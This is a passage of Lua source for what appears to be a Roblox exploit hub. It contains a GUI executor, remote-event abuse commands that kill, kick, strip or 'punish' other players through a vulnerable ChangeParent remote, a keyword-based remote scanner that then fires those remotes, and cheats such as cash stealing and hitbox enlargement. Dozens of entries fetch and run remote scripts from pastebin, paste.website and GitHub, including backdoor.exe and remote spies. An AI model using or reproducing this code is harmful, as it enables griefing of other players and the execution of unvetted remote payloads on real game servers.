			NewPlayer.Text = v.Name
			NewPlayer.Parent = script.Parent
			NewPlayer.Visible = true
			NewPlayer.MouseButton1Click:Connect(function()
				Player.Value = NewPlayer.Text
			end)
		end
	end
end
coroutine.wrap(GKOVJ_fake_script)()
local function EHNJJIG_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.AdminPanel.Visible = true
		script.Parent.Parent.Packages.Visible = false
		script.Parent.Parent.Executor.Visible = false
	end)
end
coroutine.wrap(EHNJJIG_fake_script)()
local function QRUYCIJ_fake_script() -- refresh.LocalScript 
	local script = Instance.new('LocalScript', refresh)

	script.Parent.MouseButton1Click:Connect(function()
		for i,v in pairs(script.Parent.Parent.AdminPanel.PlayersFrame:GetChildren()) do
			if v:IsA("TextButton") then
				if v.Name == "ExamplePlrs" then
					-- none
				else
					v:Destroy()
				end
			end
		end

		for i,v in pairs(game:GetService("Players"):GetChildren()) do
			if v:IsA("Player") then
				--local NewPlayer = Instance.new("TextButton",script.Parent)
				--NewPlayer.Active = true
				--NewPlayer.AutoButtonColor = true
				--NewPlayer.BackgroundColor3 = Color3.new(66,64,66)
				--NewPlayer.BackgroundTransparency = 0.7
				--NewPlayer.BorderSizePixel = 0
				--NewPlayer.Name = v.Name
				--NewPlayer.Visible = true
				--NewPlayer.Text = v.Name
				--NewPlayer.TextColor3 = Color3.new(255,255,255)
				--NewPlayer.TextScaled = true
				--NewPlayer.TextWrapped = true
				local NewPlayer = ExamplePlrs:Clone()
				NewPlayer.Name = v.Name
				NewPlayer.Text = v.Name
				NewPlayer.Parent = PlayersFrame.ScrollingFrame
				NewPlayer.Visible = true
				NewPlayer.MouseButton1Click:Connect(function()
					Player.Value = NewPlayer.Text
				end)
			end
		end
	end)
end
coroutine.wrap(QRUYCIJ_fake_script)()
local function SHGQSS_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(script.Parent.Parent.TextBox.Text)()
	end)
end
coroutine.wrap(SHGQSS_fake_script)()
local function LOFLOFC_fake_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.TextBox.Text = " "
	end)
end
coroutine.wrap(LOFLOFC_fake_script)()
local function VQHBXP_fake_script() -- TextBox_2.LocalScript 
	local script = Instance.new('LocalScript', TextBox_2)

	--local t1, count = script.Parent.Text:gsub("\n", "")

	--for i = 0, count, 1 do
	--	local CurrentLine = Instance.new("TextBox",script.Parent.Parent.Frame)
	--	CurrentLine.BackgroundTransparency = 1
	--	CurrentLine.BorderSizePixel = 0
	--	CurrentLine.LayoutOrder = 0
	--	CurrentLine.Name = count
	--	CurrentLine.Size = UDim2.new(0, 16, 0, 12)
	--	CurrentLine.ZIndex = 100
	--	CurrentLine.TextColor3 = Color3.new(255,255,255)
	--	CurrentLine.TextScaled = true
	--	CurrentLine.TextWrapped = true
	--	CurrentLine.Text = count
	--	wait(1)
	--end
end
coroutine.wrap(VQHBXP_fake_script)()
local function IRDU_fake_script() -- packages.LocalScript 
	local script = Instance.new('LocalScript', packages)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.AdminPanel.Visible = false
		script.Parent.Parent.Packages.Visible = true
		script.Parent.Parent.Executor.Visible = false
	end)
end
coroutine.wrap(IRDU_fake_script)()
local function CreateCMD(name,callback)
	local NewCMD = ExampleCMD:Clone()
	NewCMD.Name = name
	NewCMD.Text = name
	NewCMD.Parent = ScrollingFrame_2
	NewCMD.MouseButton1Click:Connect(callback)
end
local function CreateScript(name,callback)
	local NewPackage = Example:Clone()
	NewPackage.Name = name
	NewPackage.Text = name
	NewPackage.Parent = ScrollingFrame
	NewPackage.MouseButton1Click:Connect(callback)
end

CreateCMD("kill",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
    ]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = false

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end

	if load_DestroyToolTest == true then
		for i,v in pairs(PossibleRemotes) do
			v:FireServer(game:GetService("Players")[Player.Value].Character.Head)
		end
	end

	if game.PlaceId == 3554069044 then
		game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value].Character.Head, game.JointsService)
	end
end)

CreateCMD("naked",function()
	if game.PlaceId == 3554069044 then
		game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value].Character.Shirt, game.JointsService)
		game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value].Character.Pants, game.JointsService)
	end
end)

CreateCMD("dupe head",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
	]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = true

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end

	if load_DestroyToolTest == true then
		for i,v in pairs(PossibleRemotes) do
			v:FireServer(game:GetService("Players")[Player.Value].Character.Head)
		end
	end
end)

CreateCMD("dupe torso",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
	]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = true

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end

	if load_DestroyToolTest == true then
		for i,v in pairs(PossibleRemotes) do
			v:FireServer(game:GetService("Players")[Player.Value].Character.Torso)
		end
	end
end)

CreateCMD("bombhead",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
	]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = true

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end

	if load_DestroyToolTest == true then
		for i = 0, 100, 1 do
			for i,v in pairs(PossibleRemotes) do
				v:FireServer(game:GetService("Players")[Player.Value].Character.Head)
			end
		end
	end
end)

CreateCMD("bombtorso",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
	]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = true

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end

	if load_DestroyToolTest == true then
		for i = 0, 100, 1 do
			for i,v in pairs(PossibleRemotes) do
				v:FireServer(game:GetService("Players")[Player.Value].Character.Torso)
			end
		end
	end
end)

CreateCMD("view",function()
	game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[Player.Value].Character.Humanoid
end)

CreateCMD("unview",function()
	game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character.Humanoid
end)

CreateCMD("goto",function()
	game:GetService("Players").LocalPlayer.Character:PivotTo(game:GetService("Players")[Player.Value].Character:GetPivot())
end)

CreateCMD("info",function()
	local plr = game:GetService("Players")[Player.Value]
	print("--- INFO ---")
	print("Name: "..plr.Name)
	print("DisplayName: "..plr.DisplayName)
	print("Account Age: "..tostring(plr.AccountAge))
	print("Membership: "..tostring(plr.MembershipType))
	print("--- END. ---")
end)

CreateScript("RemoteTestTool",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
	]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = true

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end
	
	if load_DestroyToolTest == true then
		removething("RTT Tool",game:GetService("Players").LocalPlayer.Backpack)
		
		local RemoteTestTool = Instance.new("Tool",game:GetService("Players").LocalPlayer.Backpack)
		RemoteTestTool.Name = "RTT Tool"
		RemoteTestTool.RequiresHandle = false
		RemoteTestTool.Activated:Connect(function()
			for i,v in pairs(PossibleRemotes) do
				v:FireServer(game:GetService("Players").LocalPlayer:GetMouse().Target)
			end
		end)
	end
end)

CreateCMD("kick",function()
game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value])
end)

CreateCMD("punish",function()
game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value].Character)
end)

Follow = false

CreateCMD("annoy",function()
	local p = game:GetService("Players")[Player.Value]
	if p.Character and p.Character:FindFirstChild("Humanoid") then
		if Follow == true then
			Follow = false; return
		else Follow = true end
		while Follow == true do
			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
			wait()
		end
	end
end)

CreateCMD("unannoy",function()
Follow = false
end)

CreateScript("Infinite Yield Admin",function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

CreateScript("Dex",function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
end)

CreateScript("Rekt Hub",function()
loadstring(game:HttpGet(("https://paste.website/p/fce88396-87e3-4ed8-bb8c-1593ff174d0d.txt"), true))()
end)

CreateScript("Red All",function()
loadstring(game:HttpGet(("https://paste.website/p/a6956ce1-5a86-4da8-887f-5f828b44dd0a.txt"), true))() -- Red all
end)

CreateScript("HD Admin Brickspam",function()
loadstring(game:HttpGet(("https://paste.website/p/fcfa5271-b26f-4611-bea6-9c369dc73546.txt"), true))() -- Hd brickspam
end)

CreateScript("Bread",function()
loadstring(game:HttpGet(("https://paste.website/p/67e65cf2-1afe-4467-b04c-5ec95566807c.txt"), true))() -- bread
end)

CreateScript("Bat Gui",function()
loadstring(game:HttpGet(("https://paste.website/p/cf170836-00b6-480f-b3a4-6170a4ed730f.txt"), true))() -- Bat gui
end)

CreateScript("Box Admin",function()
loadstring(game:HttpGet(("https://paste.website/p/166b9fb0-5ab6-4555-911d-0c7e4af9b608.txt"), true))() -- Box admin
end)

CreateScript("WeAreSkids",function()
loadstring(game:HttpGet(("https://paste.website/p/fb3f5729-dd7b-44af-a145-3badfffb755a.txt"), true))() -- WeAreSkids
end)

CreateScript("Redwood Ruinier",function()
loadstring(game:HttpGet(("https://paste.website/p/aff15b93-2531-4d9b-a62a-1108fd125e24.txt"), true))() -- red wood
end)

CreateScript("Tycoon Hax",function()
loadstring(game:HttpGet(("https://rawscripts.net/raw/Super-Hero-Tycoon-Haxx-9731"), true))()
end)

CreateScript("ScriptBlox Searcher",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/ScriptSearcher"))() -- not made by kosovo this time
end)

CreateScript("Steal Tycoon Cash",function()
	for f, g in pairs(game:GetService("Workspace"):GetDescendants()) do
         if g.Name == "Giver" then
             firetouchinterest(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, g, 0)
             firetouchinterest(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, g, 1)
         end
     end
end)

CreateScript("No Tycoon Doors",function()
	for f, g in pairs(game:GetService("Workspace"):GetDescendants()) do
       if g.Name == "Pipe" then
           g:Destroy()
       end
    end
end)

CreateScript("Delete Roleplay Tool",function()
	mouse = game:GetService("Players").LocalPlayer:GetMouse()
	tool = Instance.new("Tool")
	tool.RequiresHandle = false
	tool.Name = "Delete tool"
	tool.Activated:Connect(function()
	game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(mouse.Target)
	end)
	tool.Parent = game:GetService("Players").LocalPlayer.Backpack
end)

CreateScript("Kill Roleplay Tool",function()
	mouse = game:GetService("Players").LocalPlayer:GetMouse()
	tool = Instance.new("Tool")
	tool.RequiresHandle = false
	tool.Name = "Kill tool"
	tool.Activated:Connect(function()
	if mouse.Target.Parent:FindFirstChild("Humanoid") then
	game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(mouse.Target.Parent:FindFirstChild("Head"):WaitForChild("Neck"))
	end
	end)
	tool.Parent = game:GetService("Players").LocalPlayer.Backpack
end)

CreateScript("Kick Others Roleplay",function()
	for i,v in pairs(game:GetService("Players"):GetChildren()) do
		if v:IsA("Player") then
			if v.Name ~= game:GetService("Players").LocalPlayer.Name then
				game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(v,nil)
			end
		end
	end
end)

CreateScript("Punish Others Roleplay",function()
	for i,v in pairs(game:GetService("Players"):GetChildren()) do
		if v:IsA("Player") then
			if v.Name ~= game:GetService("Players").LocalPlayer.Name then
				game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(v.Character,nil)
			end
		end
	end
end)

CreateScript("Walkless Others Roleplay",function()
	for i,v in pairs(game:GetService("Players"):GetChildren()) do
		if v:IsA("Player") then
			if v.Name ~= game:GetService("Players").LocalPlayer.Name then
				game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(v.Character.HumanoidRootPart,nil)
			end
		end
	end
end)

CreateScript("Kill Others Roleplay",function()
	for i,v in pairs(game:GetService("Players"):GetChildren()) do
		if v:IsA("Player") then
			if v.Name ~= game:GetService("Players").LocalPlayer.Name then
				game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(v.Character:WaitForChild("Head"):WaitForChild("Neck"),nil)
			end
		end
	end
end)

CreateScript("HitBox & Infjump",function()
local InfiniteJumpEnabled = true game:GetService("UserInputService").JumpRequest:connect(function() if InfiniteJumpEnabled then game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping") end end)
game.Players.LocalPlayer.UserId = "2205774994"
_G.HeadSize = 20 _G.Disabled = true game:GetService('RunService').RenderStepped:connect(function() if _G.Disabled then for i,v in next, game:GetService('Players'):GetPlayers() do if v.Name ~= game:GetService('Players').LocalPlayer.Name then pcall(function() v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize) v.Character.HumanoidRootPart.Transparency = 0.7 v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue") v.Character.HumanoidRootPart.Material = "Neon" v.Character.HumanoidRootPart.CanCollide = false end) end end end end)
end)

CreateScript("Arabic Admin Room",function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-589.1566772460938, -34.270896911621094, 241.41119384765625))
end)

CreateScript("Arabic Spawn Point",function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-592.3201293945312, 52.972572326660156, 164.14683532714844))
end)

CreateScript("Package Plugins",function()
CreateCMD("lray",function()
-- Red Hyper Laser Gun
game:GetService("Players").LocalPlayer.Character:WaitForChild("Hyperlasergun",0.1):WaitForChild("ServerControl",0.1):InvokeServer("Click",true,game:GetService("Players")[Player.Value].Character.Head.Position)
end)
CreateCMD("ray",function()
-- Black Hole Gear
game:GetService("Players").LocalPlayer.Character:WaitForChild("Gravity Inducer").WeaponEvent:FireServer("Fire",game:GetService("Players")[Player.Value].Character.Head.Position)
end)
end)

--// AutomaticBlox
local scripts = {
	["RobloxHacks"] = game:HttpGet("https://paste.website/p/1ca2aab2-5999-46d8-b9d1-39eb4a442eb9.txt"),
	["LazyHub"] = game:HttpGet("https://paste.website/p/28c3971b-674d-42c3-afd2-1af396eeddd1.txt"),
	["Hydroxide Spy"] = game:HttpGet("https://raw.githubusercontent.com/Upbolt/Hydroxide/revision/ui/modules/RemoteSpy.lua"),
	["Mr Spy V2"] = game:HttpGet("https://raw.githubusercontent.com/harisiskandar178/Roblox-Script/main/mrspy%20v2.txt"),
	["Mr Spy V1"] = game:HttpGet("https://pastebin.com/raw/bbYeT7z5"),
	["Remote2Script Spy"] = game:HttpGet("https://raw.githubusercontent.com/ou1z/Roblox-Scripts/master/Remote2Script.lua"),
	["Simple Spy"] = game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua"),
	["0fiiz Vuln Checker"] = game:HttpGet("https://paste.website/p/deacbe63-7727-4a6c-add9-3be90e15002e.txt"),
	["Kosovo Vuln Checker"] = game:HttpGet("https://paste.website/p/e29ced8a-952e-4e59-9cb3-d15651694f3b.txt"),
	["Prison Commands"] = game:HttpGet("https://pastebin.com/raw/1RvgFtcx"),
	["Prison Killer"] = game:HttpGet("https://paste.website/p/2e644f91-e064-49e0-972d-07476acd31c3.txt"),
	["Prison Ware"] = game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"),
	["illremember Shattervast Admin"] = game:HttpGet("https://pastebin.com/raw/iL4NRDux"),
	["illremember Reviz Admin"] = game:HttpGet("https://pastebin.com/raw/Caniwq2N"),
	["illremember OPFinality Hub"] = game:HttpGet("https://pastebin.com/raw/T5Y2zbyT"),
	["illremember Animation Hub"] = game:HttpGet("https://pastebin.com/raw/0MLPL32f"),
	["Google Script Hub"] = game:HttpGet("https://pastebin.com/raw/JcNAaJvZ"),
	["Swim Hub"] = game:HttpGet("https://raw.githubusercontent.com/SwimPaste/swimhack/main/swimloader_ui.lua"),
	["V.G Hub"] = game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub"),
	["VHub (keys)"] = game:HttpGet("https://raw.githubusercontent.com/V31nc/2642/Created/VHub"),
	["Fanmade Synapse Hub"] = game:HttpGet("https://paste.website/p/49cb753f-6618-4e2a-a23d-be5723a5b7b3.txt"),
	["ClickTweens"] = game:HttpGet("https://paste.website/p/72bec212-54ea-4050-9d71-a0476981e69f.txt"),
	["Erased Admin"] = game:HttpGet("https://paste.website/p/7d6deca7-b380-4bc0-98cb-46695e073fba.txt"),
}

for i,v in pairs(scripts) do
	CreateScript(i,function()
	loadstring(v)() -- not made by kosovo this time
	end)
end

--// Initalizing
count = 0
for i,v in pairs(ScrollingFrame:GetChildren()) do
if v:IsA("TextButton") then
count = count + 1
end
end
fourmula = math.floor(count / 3) - 7.5
ScrollingFrame.CanvasSize = UDim2.new(0,0,fourmula,0)
end)
AddCmd('Stigma','',function()
-- Gui to Lua
-- Version: 3.2

-- Instances:

local Li = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Main2 = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local Orbit = Instance.new("ImageLabel")
local Ring = Instance.new("ImageLabel")
local UICorner_2 = Instance.new("UICorner")

--Properties:

Li.Name = "Li"
Li.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Li.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Li.DisplayOrder = 999
Li.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = Li
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.BackgroundTransparency = 1.000
Main.Position = UDim2.new(0.0103510749, 0, 0.860321403, 0)
Main.Size = UDim2.new(0, 91, 0, 92)

Main2.Name = "Main2"
Main2.Parent = Main
Main2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main2.BackgroundTransparency = 1.000
Main2.Position = UDim2.new(-0.0169143677, 0, 0.097826086, 0)
Main2.Size = UDim2.new(0, 91, 0, 88)
Main2.ZIndex = 3
Main2.Image = "http://www.roblox.com/asset/?id=7102117818"
Main2.SliceScale = 3.000

UICorner.CornerRadius = UDim.new(0.5, 0)
UICorner.Parent = Main2

Orbit.Name = "Orbit"
Orbit.Parent = Main
Orbit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Orbit.BackgroundTransparency = 1.000
Orbit.BorderSizePixel = 4
Orbit.Position = UDim2.new(0.074000001, 0, 0, 15)
Orbit.Size = UDim2.new(0, 12, 0, 12)
Orbit.ZIndex = 2
Orbit.Image = "rbxassetid://7101990169"
Orbit.ImageColor3 = Color3.fromRGB(96, 112, 255)
Orbit.ImageTransparency = 0.200
Orbit.ScaleType = Enum.ScaleType.Fit
Orbit.SliceScale = 4.000

Ring.Name = "Ring"
Ring.Parent = Main
Ring.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Ring.BackgroundTransparency = 1.000
Ring.Position = UDim2.new(-0.0169143677, 0, 0.097826086, 0)
Ring.Size = UDim2.new(0, 91, 0, 88)
Ring.Image = "http://www.roblox.com/asset/?id=7102118272"
Ring.SliceScale = 3.000

UICorner_2.CornerRadius = UDim.new(0.5, 0)
UICorner_2.Parent = Ring

-- Scripts:

local function RJKE_fake_script() -- Li.LocalScript 
	local script = Instance.new('LocalScript', Li)

	
	local Main2 = script.Parent.Main.Main2
	local Orbit = script.Parent.Main.Orbit
	local Ring = script.Parent.Main.Ring
	local Main = script.Parent.Main
	--Notice: This relies on the fact it will be a perfectly round icon.
	local RS = game:GetService("RunService").Heartbeat
	local Tween = game:GetService("TweenService")
	local WaitTime = 0.25
	local LoadInfo = TweenInfo.new(WaitTime,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0)
	local FlashInfo = TweenInfo.new(WaitTime,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,1,true,0)
	local hk = Main.AbsoluteSize.X/2
	local MainSize = Main.AbsoluteSize.X
	local ls = Orbit.AbsoluteSize.X/2
	local r = hk
	local theta = 0
	local step = (2*math.pi)/450
	local rotvel = 0.35
	local StepInstance = Instance.new("NumberValue")
	local RotInstance = Instance.new("NumberValue")
	StepInstance.Changed:Connect(function()
		step = StepInstance.Value
	end)
	RotInstance.Changed:Connect(function()
		rotvel = RotInstance.Value
	end)
	
	local Modes = {
		--Main Image--
		Tween:Create(Main2,LoadInfo,{ImageTransparency=0.5}), --Indicates script loading
		Tween:Create(Main2,LoadInfo,{ImageTransparency=1}),   --Indicated script completed
		Tween:Create(Main2,FlashInfo,{ImageTransparency=0}),   --Pulse effect for completed
		--Step Tween--
		Tween:Create(StepInstance,LoadInfo,{Value=(2*math.pi)/180}),
		Tween:Create(StepInstance,LoadInfo,{Value=(2*math.pi)/450}),
		--Rot Tween--
		Tween:Create(RotInstance,LoadInfo,{Value=1}),
		Tween:Create(RotInstance,LoadInfo,{Value=0.35}),
	}
	Modes[2].Completed:Connect(function()
		Modes[3]:Play()
	end)
	
	local function ScriptLoading()
		Modes[6]:Play()
		Modes[4]:Play()
		Modes[1]:Play()
	end
	
	local function ScriptDone()
		Modes[2]:Play()
		Modes[5]:Play()
		Modes[7]:Play()
	end
	spawn(function()
		local deb = false
		local hi = script.Parent.Main
		hi:TweenPosition(UDim2.new(0.5, -50,0.5, -50), Enum.EasingDirection.In)
		wait'3'
		hi:TweenPosition(UDim2.new(0, 12,1, -115), Enum.EasingDirection.Out)
		game:GetService'Players'.LocalPlayer.Chatted:Connect(function(agg)
			pcall(function()
				if agg == '/e hidemeh' then
					hi.Visible = not hi.Visible
				end
			end)
		end)
	end)
	
		
	while RS:wait() do
		theta = theta < 360 and theta + step or 0
		local x = (hk + r * math.cos(theta) - ls)
		local y = (hk + r * math.sin(theta) - ls)
		Orbit.Position = UDim2.new(x/MainSize,0,y/MainSize,0)
		Ring.Rotation = Ring.Rotation < 360 and Ring.Rotation + rotvel or 0
		RS:wait()
	end
end
coroutine.wrap(RJKE_fake_script)()

end)
AddCmd('Cross','',function()

local Handles = {
    CFrame.new(0, -0.5000010132789612, 0),
CFrame.new(0, -1.5000120401382446, 0),
CFrame.new(0, -2.5000228881835938, 0),
CFrame.new(0, -3.500035047531128, 0),
CFrame.new(0, -4.500043869018555, 0),
CFrame.new(0, -5.500058174133301, 0),
CFrame.new(0, -6.500070095062256, 0),
CFrame.new(0, -7.5000810623168945, 0),
CFrame.new(0, -8.500085830688477, 0),
CFrame.new(0, -9.500186920166016, 0),
CFrame.new(-4, -10.500103950500488, 0),
CFrame.new(-5, -10.500103950500488, 0),
CFrame.new(-6, -10.500103950500488, 0),
CFrame.new(4, -10.500103950500488, 0),
CFrame.new(5, -10.500103950500488, 0),
CFrame.new(6, -10.500103950500488, 0),
CFrame.new(-3, -10.500103950500488, 0),
CFrame.new(-2, -10.500103950500488, 0),
CFrame.new(-1, -10.500103950500488, 0),
CFrame.new(-7, -10.500103950500488, 0),
CFrame.new(-8, -10.500103950500488, 0),
CFrame.new(-9, -10.500103950500488, 0),
CFrame.new(7, -10.500103950500488, 0),
CFrame.new(8, -10.500103950500488, 0),
CFrame.new(9, -10.500103950500488, 0),
CFrame.new(10, -10.500103950500488, 0),
CFrame.new(-10, -10.500103950500488, 0),
CFrame.new(0, -10.500103950500488, 0),
